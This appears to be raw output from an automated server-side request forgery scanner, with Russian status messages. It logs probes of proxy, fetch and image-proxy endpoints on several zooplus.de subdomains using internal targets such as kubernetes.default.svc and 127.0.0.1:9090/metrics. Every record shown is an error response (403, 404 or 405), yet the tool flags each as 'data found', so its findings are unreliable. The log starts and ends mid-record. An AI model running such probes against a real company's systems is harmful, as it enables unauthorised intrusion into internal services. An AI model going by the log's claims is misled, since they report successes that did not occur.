+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[*] Прогресс: 50/459 тестов выполнено...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/request
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: m.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/request
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
